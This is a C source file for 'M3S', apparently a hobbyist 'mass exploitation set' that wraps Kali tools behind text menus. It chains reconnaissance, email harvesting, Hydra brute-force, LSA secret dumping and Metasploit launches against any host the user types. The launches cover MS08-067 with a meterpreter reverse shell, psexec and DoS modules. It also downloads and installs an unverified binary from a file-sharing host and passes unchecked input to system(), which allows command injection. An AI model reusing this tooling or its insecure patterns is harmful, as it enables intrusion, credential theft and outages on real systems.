#include <stdio.h>
#include "installs.h"

void clear(void)
{
char command[1024];
strcpy( command, "clear");
system(command);
}

void time(void)
{
   printf("\n\n");
   printf("\tToday date (%s)\n", __DATE__ );
   printf("\tNow Time (%s)\n", __TIME__ );
}
void Banner(void)
{
printf("\n");
printf("\E[31m");
printf("\E[1m");
printf("\tM          M    EEEEEEEEEEEE     SSSSSSSSSSSSS \n");
printf("\tMM        MM    E                S             \n");  
printf("\tMMM      MMM    E                S             \n");
printf("\tM  M    M  M    E                S             \n");
printf("\tM   M  M   M    EEEEEEEEEEEE     S S S S S S S \n");
printf("\tM    MM    M    E                            S \n");
printf("\tM          M    E                            S \n");
printf("\tM          M    E                            S \n");
printf("\tM          M    EEEEEEEEEEEE     SSSSSSSSSSSSS \n");
printf("\E[1m");
printf("\E[0m");
printf("\n");
}

void Reklamim(void)
{
printf("\E[32m");
printf("""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""\n");
printf("\t?...? SHARE THIS TOOL TO MAKE IT SUCCESFULLY           /.../   \n");
printf("\t?...? VALID IN KALI AND BACKTRACK                      /.../   \n");
printf("\t?...? Made by Florian Millo(MIND Z SEC)                /.../   \n");
printf("\t?...? M3S == MASS 3XPLO1TAT10N S3T                     /.../   \n");
printf("\t?...? VERSION 1.00 (NEXT VERSION WITH NETWORK HACKING) /.../   \n");
printf("\t?...? AUTOMATED EXPLOITATION FOR                       /.../   \n");
printf("\t?...? P3NTESTERS AND H4CKERS                           /.../   \n");
printf("\t?>>>?  CONTACT TO flor_iano@hotmail.com                /<</    \n");
printf("""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""\n");
printf("\E[32m");
}
void mkdor(void)
{
FILE *fptr = fopen("/opt/M3S/mes", "r");
if(fptr)
{
fclose(fptr);
}
else{
printf("\E[32m");
printf("\n\tM3S >> INSTALLING M3S TO /opt/M3S/ and ADDING REPOSITORIES\n\n");
char command[1024];
int i;
strcpy( command, "cd .. && chmod 777 M3S && mv M3S /opt/M3S && cp /opt/M3S/mes /usr/bin");
system(command);
printf("\n\tM3S >> DO YOU WANT TO INSTALL REPOSITORIES(TYPE 1),(IF YOU HAVE INSTALLED THAT ONCE TIME TYPE 0): ");
scanf("%d", &i);
if(i == 1)
{
strcpy( command, "chmod 777 installer.sh && ./installer.sh && apt-get update && apt-get upgrade");
system(command);
instalimet();
}else if(i == 0){
printf("\n\tM3S >> REDIRECTING YOU TO MENU\n\n");
}
}
}
int main(void)
{
char command[1024];
if(geteuid() != 0){
printf("\n\tM3S >> HAHAHA(YOU ARE JOKKING , YOU NEED ROOT TO OPEN THE PROGRAM ) <<\n\n");
}
else{
printf("\n\tM3S >> IS A MUST TO READ THE LICENSE ABOVE(1 for yes:0 for no): ");
int license;
scanf("%d", &license);
if(license == 1)
{
printf("\E[32m");
printf("This proam is called M3S == MASS EXPLOITATION SET \
    \nCopyright (C) 2014+  author:Florian MILLO(MIND Z SEC)\
    \nThis program is free software: you can redistribute it and/or modify\
    \nit under the terms of the GNU General Public License as published by\
    \nthe Free Software Foundation, either version 3 of the License, or\
    \n(at your option) any later version.\
    \nThis program is distributed in the hope that it will be useful,\
    \nbut WITHOUT ANY WARRANTY; without even the implied warranty of\
    \nMERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the\
    \nGNU General Public License for more details.\
    \nYou should have received a copy of the GNU General Public License\
    \nalong with this program.  If not, see www.gnu.org/licenses");
}else{exit(0);}
mkdor();
clear();
time();
int ik;
Banner();
Reklamim();
printf("\n\tM3S >> IF YOU TYPE (Char(?!) UND STRINGS (exit,help) THEN I WILL CLOSE THE PROGRAM) \n\n");
printf("\n");
printf("\E[33m");
printf("\t(1) Information Gathering\n\n");
printf("\t(2) Vulnerability Analysis\n\n");
printf("\t(3) WEB Vulnerability Scanning\n\n");
printf("\t(4) Attack Vectors\n\n");
printf("\t(5) Exploitation T00LS\n\n");
printf("\t(0) Exit\n\n");
printf("\E[33m");
printf("\E[31m");
printf("\tM3S >> ");
printf("\E[31m");
scanf("%d", &ik);
if(ik == FALSE && ik != 0)
{main();
}else {
switch(ik)
{
case 1:
info();
break;
case 2:
vulna();
break;
case 3:
locally();
break;
case 4:
attack_vector();
break;
case 5:
exploitation();
break;
case 0:
printf("\n\t7H4NK Y0U F0R US1NG MY 700L\n");
printf("\n\t3V3RY SYS73M C4N B3 3XPL0!73D, M3S >> IS HERE FOR YOU <<  \n\n");
exit(0);
break;
default:
if(ik >= FALSE && ik != 0)
{main();}else{
printf("\n\tSH4R3 T0 M4K3 !T SUCC3SSFULLY\n\n");
printf("\n\tPR0GR4M!NG H3LPS Y0U TO TH!NK  \n\n");
}
}
}
return 1;
}
}

void info(void)
{
clear();
Banner();
Reklamim();
int option;
printf("\n\tM3S >> IF YOU TYPE (Char(?!) UND STRINGS (exit,help) THEN I WILL CLOSE THE PROGRAM) \n\n");
printf("\n");
printf("\E[33m");
printf("\n\t(1) WHOIS Information.      \n");
printf("\n\t(2) Banner Grabbing.        \n");
printf("\n\t(3) SNMP Sweeps and Zone Transfers.            \n");
printf("\n\t(4) DNS Discovery.          \n");
printf("\n\t(5) Service Fingerprinting. \n");
printf("\n\t(6) Email harverster        \n");
printf("\n\t(7) OS FingerPrinting\n");
printf("\n\t(0) Return menu.            \n");
printf("\E[33m");
printf("\E[31m");
printf("\n\tM3S >>  ");
printf("\E[31m");
scanf("%d", &option);
if(option == FALSE && option != 0)
{info();}
else{
switch(option)
{
case 1:
ora_doda(); 
break;
case 2:
amap();
break;
case 3:
SnMp();
break;
case 4:
dns_disc();
break;
case 5:
service();
break;
case 6:
harv();
break;
case 7:
os();
break;
case 0:
main();
break;
default:
if(option >= FALSE && option != 0)
{info();}else{
printf("\n\tSH4R3 T0 M4K3 !T SUCC3SSFULLY\n\n");
printf("\n\tPR0GR4M!NG H3LPS Y0U TO TH!NK  \n\n");
}
}
}
}
void os(void)
{
clear();
Banner();
Reklamim();
printf("\n\tM3S >> IF YOU TYPE (Char(?!) UND STRINGS (exit,help) THEN I WILL CLOSE THE PROGRAM) \n\n");
printf("\n");
printf("\n\t(1) OS FingerPrint with NMap\n");
printf("\n\t(2) OS FingerPrint with Xprobe2\n");
printf("\n\t(3) OS FingerPrint with HPING3\n");
printf("\n\t(0) To Retun back To menu\n");
printf("\n\tM3S >> ");
int opt;
scanf("%d", &opt);
if(opt == FALSE && opt != 0)
{os();}
else{
if(opt == 1)
{char host[1024];
printf("\n\tM3S >> OS FingerPrint with NMAP >> Type your target >> ");
scanf("%s", host);
int len=strlen(host);
char command[len];
sprintf( command, "nmap -T4 -O -A -sV -Pn %s ", host);
system(command);
os();
}
else if(opt == 2)
{
char host[1024];
printf("\n\tM3S >> OS FingerPrint with Xprobe2 >> Type your target ip >> ");
scanf("%s", host);
int len=strlen(host);
char command[len];
sprintf( command," xprobe2 -v %s", host);
system(command);
os();}
else if(opt == 3)
{
char host[1024];
int port;
printf("\n\tM3S >> OS FingerPrint with Hping3 >> Type your target (i.e 192.168.1.1 80) >> ");
scanf("%s %d", host, &port);
int len=strlen(host);
char command[len];
sprintf( command,"hping3 %s -Q -p %d -S ", host, &port);
system(command);
os();
}
else if(opt == 0)
{info();}
}
if(opt >= FALSE && opt != 0)
{os();}else{exit(0);}
}
void harv(void)
{
clear();
Banner();
Reklamim();
int ch;
char host[1024];
printf("\n\tM3S >> IF YOU TYPE (Char(?!) UND STRINGS (exit,help) THEN I WILL CLOSE THE PROGRAM) \n\n");
printf("\n");
printf("\n\t(1) Email Harvest with google.\n");
printf("\n\t(2) Email Harvest with bing.\n");
printf("\n\t(0) Return To Menu\n");
printf("\n\tM3S >> ");
scanf("%d", &ch);
if(ch == FALSE && ch != 0)
{harv();}
else{
if(ch == 1)
{
printf("\n\tEmail HARVEST\n");
printf("\n\tM3S >> Email harvest with google >> Type the target >> ");
scanf("%s", host);
int len=strlen(host);
char command[len];
sprintf( command, "theharvester -d %s -l 1200 -b google", host);
system(command);
info();
}
}
if(ch == 2)
{
printf("\n\tEmail HARVEST\n");
printf("\n\tM3S >> Email harvest with bing >> Type the target >> ");
scanf("%s", host);
int len=strlen(host);
char command[len];
sprintf( command, "theharvester -d %s -l 1200 -b bing", host);
system(command);
info();
}
if(ch == 0){info();}
else{
if(ch >= FALSE && ch != 0)
{harv();}
else{
printf("\n\tSH4R3 T0 M4K3 !T SUCC3SSFULLY\n\n");
printf("\n\tPR0GR4M!NG H3LPS Y0U TO TH!NK  \n\n");}
}
}
void ora_doda(void)
{
clear();
Banner();
Reklamim();
int opt;
printf("\n\tM3S >> IF YOU TYPE (Char(?!) UND STRINGS (exit,help) THEN I WILL CLOSE THE PROGRAM) \n\n");
printf("\n");
printf("\n\t(1) INFO about a website.          \n");
printf("\n\t(2) INFO Internet Protocol(IP).\n");
printf("\n\t(0) Return to Menu.              \n");
printf("\n\tM3S >>  ");
scanf("%d", &opt);
if(opt == FALSE && opt != 0)
{ora_doda();}
else{
if(opt == 1)
{
char hostname[1024];
printf("\n\tM3S >> WHOIS INFO >> Type in your website to get information >>   ");
scanf("%s", hostname);
int len=strlen(hostname);
char command[len];
sprintf(command,"whois %s", hostname);
system(command);
ora_doda();
}
if (opt == 2)
{
char ip[1024];
printf("\n\tM3S >> WHOIS >> Type in your target ip address to get information >>   ");
scanf("%s", ip);
int len=strlen(ip);
char command[len];
sprintf(command, "whois %s", ip);
system(command);
ora_doda();
}
if(opt == 0)
{
info();
}else{
if(opt >= FALSE && opt != 0)
{ora_doda();}
ora_doda();
}
}
}
void amap(void)
{
clear();
Banner();
Reklamim();
char hostname[1024];
int ch;
int port;
printf("\n\tM3S >> IF YOU TYPE (Char(?!) UND STRINGS (exit,help) THEN I WILL CLOSE THE PROGRAM) \n\n");
printf("\n");
printf("\n\t(1) Banner Grabbing whithout dump\n");
printf("\n\t(2) Banner Grabbing with dump \n");
printf("\n\t(0) Return to menu \n");
printf("\n\tM3S >> ");
scanf("%d", &ch);
if(ch == FALSE && ch != 0)
{amap();
}
else {
if(ch == 1)
{
printf("\n\tM3S >> Banner grabbing (no dump) >> Type in your target hostname and target port >> ");
scanf("%s", hostname);
scanf("%d", &port);
int len = strlen(hostname);
char command[len];
sprintf( command, "amap -bqv -1 %s %d", hostname, port);
system(command);
info();
}
if(ch == 2)
{
printf("\n\tM3S >> Banner grabbing with dump >> Type in your target hostname and (<target> <port> i.e www.google.com 80) >> ");
scanf("%s %d", hostname,  &port);
int len = strlen(hostname);
char command[len];
sprintf( command, "amap -bqvd -1 %s %d", hostname, port);
system(command);
info();
}
if(ch == 0)
{
info();
}else{if(ch >= FALSE && ch != 0)
{amap();}
info();
}
}
}
void SnMp(void)
{
clear();
Banner();
Reklamim();
int ch;
char hostname[1024];
int port;
printf("\n\tM3S >> IF YOU TYPE (Char(?!) UND STRINGS (exit,help) THEN I WILL CLOSE THE PROGRAM) \n\n");
printf("\n");
printf("\n\t(1) SNMP SWEEP \n");
printf("\n\t(2) Zone transfer(if :53 Open)\n");
printf("\n\t(0) Return to Menu\n");
printf("\n\tM3S >> ");
scanf("%d", &ch);
if(ch == FALSE && ch != ch)
{SnMp();
}else{
if(ch == 1)
{
printf("\n\tM3S >> SNMP SWEEP >> Type in IP address and port >> ");
scanf("%s %d", hostname, &port);
int len = strlen(hostname);
char command[len];
sprintf( command, "snmpcheck -D -r 2 -t %s %d", hostname, port);
system(command);
info();
}
if(ch == 2)
{
printf("\n\tM3S >> Zone Transfer >> Type in your target dns to get ZT >> ");
scanf("%s", hostname);
int len = strlen(hostname);
char command[len];
char l = '.';
sprintf( command,"dnswalk %s%c ", hostname, l);
system(command);
info(); 
}
if(ch == 0)
{info();
}
else {if(ch >= FALSE && ch != 0){SnMp();}
SnMp();
}
}

}


void dns_disc(void)
{
clear();
Banner();
Reklamim();
int ch;
printf("\n\tM3S >> IF YOU TYPE (Char(?!) UND STRINGS (exit,help) THEN I WILL CLOSE THE PROGRAM) \n\n");
printf("\n");
printf("\n\t(1) DNS MAPPER \n");
printf("\n\t(2) DNS Information \n");
printf("\n\t(3) Trace DNS \n");
printf("\n\t(4) Recon Dns \n");
printf("\n\t(5) DNS TeST\n");
printf("\n\t(0) Return to menu \n");
printf("\n\tM3S >> ");
scanf("%d", &ch);
if(ch == FALSE && ch != 0)
{dns_disc();}
else{
if(ch == 1)
{
char hostname[1024];
printf("\n\tM3S >> DNS MAPPER >> Type in your target website to map DNS >> ");
scanf("%s", hostname);
int len=strlen(hostname);
char command[len];
sprintf( command, "dnsmap %s", hostname);
system(command);
printf("\n\tM3S succesfully MAPPED out THE DNS\n\n");
dns_disc();
}
else if (ch == 2)
{
char hostname[1024];
printf("\n\tM3S >> DNS Information >> Type in your target hostname to get INFO >> ");
scanf("%s", hostname);
int len=strlen(hostname);
char command[len];
sprintf( command, "dnsenum -t 15 %s", hostname);
system(command);
printf("\n\tM3S succesfully got info for your target\n\n");
dns_disc();
}
else if (ch == 3)
{
char hostname[1024];
printf("\n\tM3S >> Trace DNS >> Type in your target host to trace DNS >> ");
scanf("%s", hostname);
int len=strlen(hostname);
char command[len];
sprintf( command, "dnstracer -v %s ",hostname);
system(command);
printf("\n\tM3S succesfully traced the target dns \n\n");
dns_disc(); 
}
else if (ch == 4)
{
char hostname[1024];
printf("\n\tM3S >> DNS Recon >> Type in your target host to recon DNS >> ");
scanf("%s", hostname);
int len=strlen(hostname);
char command[len];
sprintf( command, "dnsrecon -d %s -g -w", hostname);
system(command);
printf("\n\tM3S Successfully Reconnaisanced the target DNS \n\n");
dns_disc();
}
else if(ch == 5)
{
char hostname[1024];
printf("\n\tM3S >> DNS TeST >> Type in you target DNS >> ");
scanf("%s", hostname);
int len=strlen(hostname);
char command[len];
sprintf( command, "fierce -dns %s", hostname);
system(command);
printf("\n\tM3S Succesfully Tested DNS \n");
dns_disc();
}
else if(ch == 0)
{
info();
}
else{
if(ch >= FALSE && ch != 0)
{dns_disc();}
info();
}
}
}

void service(void)
{
clear();
Banner();
Reklamim();
struct integ
{
int opt;
char host[9999];
};
struct integ it;
printf("\n\tM3S >> IF YOU TYPE (Char(?!) UND STRINGS (exit,help) THEN I WILL CLOSE THE PROGRAM) \n\n");
printf("\n");
printf("\n\t(1) What ? Hosts ? alive ? in a subnet\n");
printf("\n\t(2) Application Service FingerPrint\n");
printf("\n\t(3) Deep FingerPrint\n");
printf("\n\t(4) Version ( SSL ) FingerPrint\n"); 
printf("\n\t(0) Retun To Menu\n");
printf("\n\tM3S >> ");
scanf("%d", &it.opt);
if(it.opt == FALSE && it.opt != 0)
{service();}
else{
if(it.opt == 1)
{
printf("\n\tM3S >> What ? Hosts ? alive ? in a subnet >> Type in your target >> ");
scanf("%s", it.host);
int len=strlen(it.host);
char command[len];
sprintf( command, "nmap -sP -T4 -Pn %s/24", it.host);
if(it.host == 0){exit(0);}
else{
system(command);
printf("\n\tM3S done its job for you \n\n");
info();
}}
if(it.opt == 2)
{
printf("\n\tM3S >> Application Service FingerPrint >> Type in your target >> ");
scanf("%s", it.host);
int len=strlen(it.host);
char command[len];
sprintf( command, "nmap -sV -T4 -Pn %s/24", it.host);
system(command);
printf("\n\tM3S done its job for you \n\n");
info();
}
if(it.opt == 3)
{
printf("\n\tM3S >> Deep FingerPrint >> Type in your target >> ");
scanf("%s", it.host);
int len=strlen(it.host);
char command[len];
sprintf( command, "nmap -sP -T4 -A %s/24", it.host);
system(command);
printf("\n\tM3S done its job for you \n\n");
info();
}
if(it.opt == 4)
{
printf("\n\tM3S >> Version ( SSL ) FingerPrint >> Type in your target >> ");
scanf("%s", it.host);
int len=strlen(it.host);
char command[len];
sprintf( command, "sslscan --http %s", it.host);
system(command);
printf("\n\tM3S done its job for you \n\n");
info();
}
}
if(it.opt == 0)
{
printf("\n\tM3S im sending you to the menu \n\n");
info();
}
else{if(it.opt >=FALSE && it.opt != 0){
info();
}
service();
}
}

void vulna(void)
{
clear();
Banner();
Reklamim();
struct oto
{
int opt;
char host[9999];
int proto;
int port;
};
struct oto ot;
printf("\n\tM3S >> IF YOU TYPE (Char(?!) UND STRINGS (exit,help) THEN I WILL CLOSE THE PROGRAM) \n\n");
printf("\n");
printf("\n\t(1) Buffer Overflow Test\n");
printf("\n\t(2) Deep Analysis\n");
printf("\n\t(3) Scan web server for known vulnerabilities\n");
printf("\n\t(4) Network Stimulus\n");
printf("\n\t(0) Return To Main Menu\n");
printf("\n\tM3S >> ");
scanf("%d", &ot.opt);
if(ot.opt == FALSE && ot.opt != 0)
{vulna();}
else{
if(ot.opt == 1)
{
printf("\n\tM3S >> Buffer Overflow Test >> Target address (i.e <target> <port>) >> ");
scanf("%s %d", ot.host, &ot.port);
int len1=strlen(ot.host);
char command[len1];
sprintf( command, "bed -s HTTP -t %s -p %d", ot.host, ot.port);
system(command);
main();
}
if(ot.opt == 2)
{
printf("\n\tM3S >> D33P Analysis >> Type in your target >> ");
scanf("%s", ot.host);
int len=strlen(ot.host);
char command[len];
sprintf( command, "golismero --full %s >> /root/Desktop/golismero.txt ", ot.host);
printf("\n\tM3S (I) >> Made i file to analyse the system vulnerabilities %s \n\n", ot.host);
system(command);
printf("\n\tM3S >> Succesfully done its job >> Back to Menu.\n\n");
main();
}
if(ot.opt == 3)
{
printf("\n\tM3S >> Scan for know vulnerabilites >> Type in your target >> ");
scanf("%s", ot.host);
int len=strlen(ot.host);
char command[len];
sprintf( command, "nikto -host %s >> /root/Desktop/niktoscan.txt", ot.host);
printf("\n\tM3S i made i file to analyse the system vulnerabilities\n\n");
system(command);
printf("\n\tM3S >> Successfully done its job for you >> Back To menu.\n\n");
main();
}
if(ot.opt == 4 )
{
printf("\n\tM3S >> Network Sitmulus >> Type in your target >> ");
scanf("%s", ot.host);
int len=strlen(ot.host);
char command[len];
sprintf( command, "unicornscan -i eth0 -Ir 160 -E %s/24", ot.host);
system(command);
printf("\n\tM3S >> Successfully done its job for you >> Back To menu.\n\n");
main();
}
if(ot.opt == 0)
{main();}
else{if(ot.opt >= FALSE && ot.opt != 0){vulna();}
main();
}
}
}

void locally(void)
{
clear();
Banner();
Reklamim();
struct opt
{
int opt;
char host[9999];
};
struct opt ot;
printf("\n\tM3S >> IF YOU TYPE (Char(?!) UND STRINGS (exit,help) THEN I WILL CLOSE THE PROGRAM) \n\n");
printf("\n");
printf("\n\t(1) Web Application Audit(only Kali linux). \n");
printf("\n\t(2) Web scanner to identify websites.\n");
printf("\n\t(3) Wordpress Scanner.\n");
printf("\n\t(4) Joomla Scanner.\n");
printf("\n\t(0) Return To menu.\n");
printf("\n\tM3S >> ");
scanf("%d", &ot.opt);
if(ot.opt == FALSE && ot.opt != 0)
{locally();}
else
{
if(ot.opt == 1)
{
printf("\n\tM3S >> Web Application Audit >> Type in your target with (i.e www.target.com) >> ");
scanf("%s", ot.host);
int len = strlen(ot.host);
char command[len];
sprintf( command, "wapiti %s", ot.host);
system(command);
printf("\n\tM3S >> Succesfully done its job for you << Going Back to menu < \n\n");
locally();
}
if(ot.opt == 2)
{
printf("\n\tM3S >> Web scanner to identify websites >> Type in your target with (i.e www.target.com) >> ");
scanf("%s", ot.host);
int len = strlen(ot.host);
char command[len];
sprintf( command, "whatweb %s", ot.host);
system(command);
printf("\n\tM3S >> Succesfully done its job for you << Going Back to menu < \n\n");
locally();
}
if(ot.opt == 3)
{
printf("\n\tM3S >> Wordpress Scanner >> Type in your target with (i.e www.target.com) >> ");
scanf("%s", ot.host);
int len = strlen(ot.host);
char command[len];
sprintf( command, "wpscan --url %s --enumerate u p", ot.host);
system(command);
printf("\n\tM3S >> Succesfully done its job for you << Going Back to menu < \n\n");
locally();
}
if(ot.opt == 4)
{
printf("\n\tM3S >> Joomla scanner >> Type in your target with (i.e www.target.com) >> ");
scanf("%s", ot.host);
int len = strlen(ot.host);
char command[len];
sprintf( command, "joomscan -u %s", ot.host);
system(command);
printf("\n\tM3S >> Succesfully done its job for you << Going Back to menu < \n\n");
locally();
}
if(ot.opt == 0)
{
printf("\n\tM3S >> Return to Menu << \n\n");
main();}
else{if(ot.opt >= FALSE && ot.opt != 0){locally();}
}
}
}

void attack_vector(void)
{
clear();
Banner();
Reklamim();
struct opt
{
int k;
char command[1024];
};
struct opt ot;
printf("\n\tM3S >> IF YOU TYPE (Char(?!) UND STRINGS (exit,help) THEN I WILL CLOSE THE PROGRAM) \n\n");
printf("\n");
printf("\n\t(1) Hash Identifier.\n");
printf("\n\t(2) John Attack Password.\n");
printf("\n\t(3) Hydra attack protocol\n");
printf("\n\t(4) LSA Secrets\n");
printf("\n\t(0) Return to menu\n");
printf("\n\tM3S >> ");
scanf("%d", &ot.k);
if(ot.k == FALSE && ot.k != 0)
{printf("\n\tM3S >> Redirecting you to menu\n\n");
attack_vector();
}
else {
switch(ot.k)
{
case 1:
hashid();
break;
case 2:
johnny();
break;
case 3:
hydra();
break;
case 4:
lsa();
break;
case 0:
main();
break;
default:
if(ot.k >= FALSE && ot.k !=0 ){attack_vector();}
else{
printf("\n\tSH4R3 T0 M4K3 !T SUCC3SSFULLY\n\n");
printf("\n\tPR0GR4M!NG H3LPS Y0U TO TH!NK  \n\n");}
}
}
}
void hashid(void)
{
struct opt
{
int k;
char command[1024];
};
struct opt ot;
char wgeti[99999] = "wget download856.mediafire.com/eir22qe062kg/tukrk5sj05ofo00/hash-identifier && chmod 777 hash-identifier && mv hash-identifier /usr/bin/ ";
char run[1024] = "/usr/bin/hash-identifier";
FILE *fp = fopen ("/usr/bin/hash-identifier", "r");
if(fp)
{
clear();
printf("\n\tM3S >> Find What type of  hash-id is...\n\n");
printf("\n\tM3S >> Just enter your hash there and it will scanned to see what algorithms it uses..\n\n\n");
strcpy( ot.command, "/usr/bin/hash-identifier");
system(ot.command);
fclose(fp);
clear();
attack_vector();}
else{
clear();
printf("\n\tM3S >> Will try to get it for you \n");
printf("\n\tM3S >> I got it \n\n");
strcpy( ot.command, wgeti);
system(ot.command);
printf("\n\tM3S >> Now running it \n\n");
strcpy( ot.command, run);
printf("\n\tM3S >> Just enter your hash there and it will scanned to see what algorithms hash uses.\n\n\n");
system(ot.command);
clear();
attack_vector();
}
}

void johnny(void)
{
struct opt
{
int k;
char file[1024];
char command[1024];
};
struct opt ot;
printf("\n\tM3S >> IF YOU TYPE (Char(?!) UND STRINGS (exit,help) THEN I WILL CLOSE THE PROGRAM) \n\n");
printf("\n");
printf("\n\tM3S >> John The Ripper >> Type in your file like (i.e /root/Desktop/<file>) >>  ");
scanf("%s", ot.file);
int len=strlen(ot.file);
char command[len];
sprintf( command, "/etc/john %s", ot.file);
system(command);
clear();
attack_vector();
}


void hydra(void)
{
char host[1024];
char proto[124];
char name[225];
printf("\n\tM3S >> Hydra >> Type in like (i.e username(that you think):IP or Host:ftp or ssh or any) >>  ");
scanf("%s %s %s", name, host, proto);
int len=strlen(host);
char command[len];
sprintf( command, "hydra -t 10 -V -f -l %s -x 4:6:a %s %s", name, host, proto);
system(command);
clear();
attack_vector();
}

void lsa(void)
{
char file[1024];
char file2[1024];
printf("\n\tM3S >> LSA Dump >> system hive security hive >> ");
scanf("%s", file);
int len=strlen(file);
char command[len];
sprintf( command, "lsadump %s %s", file, file2);
system(command);
clear();
attack_vector();
}


void exploitation(void)
{
clear();
Banner();
Reklamim();
int opt;
printf("\n\tM3S >> IF YOU TYPE (Char(?!) UND STRINGS (exit,help) THEN I WILL CLOSE THE PROGRAM) \n\n");
printf("\n");
printf("\n\t(1) Social-Engineering Toolkit\n");
printf("\n\t(2) Metasploit CLI\n");
printf("\n\t(3) Miscellaneus\n");
printf("\n\t(4) Scapy\n");
printf("\n\t(0) Return To main Menu\n");
printf("\n\tM3S >> ");
scanf("%d", &opt);
if(opt == FALSE && opt != 0)
{exploitation();}
else{
switch(opt)
{
case 1:
setoolkit();
break;
case 2:
msfcli();
main();
break;
case 3:
misc();
break;
case 4:
scapy();
break;
case 0:
main();
break;
default:
if(opt >= FALSE && opt != 0){exploitation();}
else{
printf("\n\tSH4R3 T0 M4K3 !T SUCC3SSFULLY\n\n");
printf("\n\tPR0GR4M!NG H3LPS Y0U TO TH!NK  \n\n");}
}
}
}

void scapy(void)
{
clear();
Banner();
Reklamim();
char command[1024];
strcpy( command ,"scapy");
system(command);
exploitation();
}
void setoolkit(void)
{
char command[1024];
printf("\n\tM3S >> Cant help in there S0RRY\n\n");
strcpy( command, "setoolkit");
system(command);
clear();
main();
}

void msfcli(void)
{
clear();
int opt;
Banner();
Reklamim();
printf("\n\tT0P T3N M0ST US3D 3XPL0!TS \n\n");
printf("\n\t(1)  Microsoft Server Service Relative Path Stack Corruption (CVE-2008-4250, MSB-MS08-067)\n");
printf("\n\t(2)  MS12-020 Microsoft Remote Desktop Use-After-Free DoS (CVE-2012-0002, MSB-MS12-020)\n");
printf("\n\t(3)  Java 7 Applet Remote Code Execution\n");
printf("\n\t(4)  Microsoft RPC DCOM Interface Overflow (CVE-2003-0352, MSB-MS03-026)\n");
printf("\n\t(5)  MS12-063 Microsoft Internet Explorer execCommand Use-After-Free Vulnerability\n");
printf("\n\t(6)  Microsoft Windows Authenticated User Code Execution (CVE-1999-0504)\n");
printf("\n\t(7)  Microsoft Windows 7 / Server 2008 R2 SMB Client Infinite Loop\n");
printf("\n\t(8)  Microsoft Server Service NetpwPathCanonicalize Overflow (CVE-2006-3439, MSB-MS06-040)\n");
printf("\n\t(9)  PHP CGI Argument Injection (CVE-2012-1823)\n");
printf("\n\t(10) Apache mod_isapi <= 2.2.14 Dangling Pointer\n");
printf("\n\t(0)  Return To Menu\n");
printf("\n\tM3S >> ");
scanf("%d", &opt);
if(opt == FALSE && opt != 0)
{msfcli();}
else{
switch(opt)
{
case 1:
ms08();
break;
case 2:
ms12();
break;
case 3:
java7();
break;
case 4:
ms03();
break;
case 5:
ms121();
break;
case 6:
ms0504();
break;
case 7:
msINF();
break;
case 8:
ms06();
break;
case 9:
msphp();
break;
case 10:
msapach();
break;
case 0:
main();
default:
if(opt >= FALSE && opt != 0)
{msfcli();}
else{if(!(opt != 0)){}
printf("\n\tSH4R3 T0 M4K3 !T SUCC3SSFULLY\n\n");
printf("\n\tPR0GR4M!NG H3LPS Y0U TO TH!NK  \n\n");}
}
}
}

void ms08(void)
{
char host[1024];
char command[1024];
printf("\n\tM3S >> Microsoft Server Service Relative Path Stack Corruption (CVE-2008-4250, MSB-MS08-067) >> Type only <RHOST>(i.e 192.168.1.1) >> ");
scanf("%s", host);
sprintf( command, "msfcli exploit/windows/smb/ms08_067_netapi PAYLOAD=windows/meterpreter/reverse_tcp LHOST=127.0.0.1 LPORT=4444 RHOST=%s RPORT=445 E", host);
system(command);
msfcli();
}




void ms12(void)
{
char host[1024];
char command[1024];
printf("\n\tM3S >> MS12-020 Microsoft Remote Desktop Use-After-Free DoS (CVE-2012-0002, MSB-MS12-020) >> Type only <RHOST>(i.e 192.168.1.1) >> ");
scanf("%s", host);
sprintf( command, "msfcli auxiliary/dos/windows/rdp/ms12_020_maxchannelids  RHOST=%s E", host);
system(command);
msfcli();
}

void java7(void)
{
int srvport; 
char ch;
char command[1024];
printf("\n\tM3S >> Java 7 Applet Remote Code Execution >> SRVPORT und URIPATH >> ");
scanf("%d %c", &srvport, &ch);
sprintf( command, "msfcli exploit/multi/browser/java_jre17_exec SRVPORT=%d URIPATH=%c E", srvport, ch);
system(command);
msfcli();
}
void ms03(void)
{
char host[1024];
char command[1024];
printf("\n\tM3S >> Microsoft RPC DCOM Interface Overflow (CVE-2003-0352, MSB-MS03-026) >> Type only RHOST(i.e 192.168.1.1) >> ");
scanf("%s", host);
sprintf( command,"msfcli exploit/windows/dcerpc/ms03_026_dcom RHOST=%s E", host);
system(command);
msfcli();
}
void ms121(void)
{
int srvport;
char uripath;
printf("\n\tM3S >> MS12-063 Microsoft Internet Explorer execCommand Use-After-Free Vulnerability >> SRVHOST und URIPATH >>  ");
scanf("%d %c", &srvport, &uripath);
char command[1024];
sprintf( command,"msfcli exploit/windows/browser/ie_execcommand_uaf SRVHOST=%d URIPATH=%c E", srvport, uripath);
system(command);
msfcli();
}
void ms0504(void)
{
printf("\n\tM3S >> Microsoft Windows Authenticated User Code Execution (CVE-1999-0504) >> Type in RHOST (i.e 192.168.1.1) >> ");
char rhost[1024];
scanf("%s", rhost);
char command[1024];
sprintf( command, "msfcli exploit/windows/smb/psexec RHOST=%s E", rhost);
system(command);
msfcli();
}
void msINF(void)
{
printf("\n\tM3S >> Microsoft Windows 7 / Server 2008 R2 SMB Client Infinite Loop >> TYPE in SRVHOST >> ");
char srvport[1024];
char command[1024];
scanf("%s", srvport);
sprintf( command,"msfcli auxiliary/dos/windows/smb/ms10_006_negotiate_response_loop SRVHOST=%s", srvport);
system(command);
msfcli();
}
void ms06(void)
{
printf("\n\tM3S >> Microsoft Server Service NetpwPathCanonicalize Overflow (CVE-2006-3439, MSB-MS06-040) >> Type in RHOST(i.e 192.168.1.1)>> ");
char rhost[1024];
char command[1024];
scanf("%s", rhost);
sprintf( command,"msfcli exploit/windows/smb/ms06_040_netapi PAYLOAD=windows/meterpreter/reverse_tcp LHOST=127.0.0.1 RHOST=%s RPORT=445 E", rhost);
system(command);
msfcli();
}
void msphp(void)
{
printf("\n\tM3S >> PHP CGI Argument Injection (CVE-2012-1823) >> Type in RHOST(i.e 192.168.1.1) >> ");
char rhost[1024];
char command[1024];
scanf("%s", rhost);
sprintf( command,"msfcli exploit/multi/http/php_cgi_arg_injection RHOST=%s E",rhost);
system(command);
msfcli();
}
void msapach(void)
{
printf("\n\tM3S >> Apache mod_isapi <= 2.2.14 Dangling Pointer >> Type in RHOST(i.e 192.168.1.1) >> ");
char rhost[1024];
char command[1024];
scanf("%s", rhost);
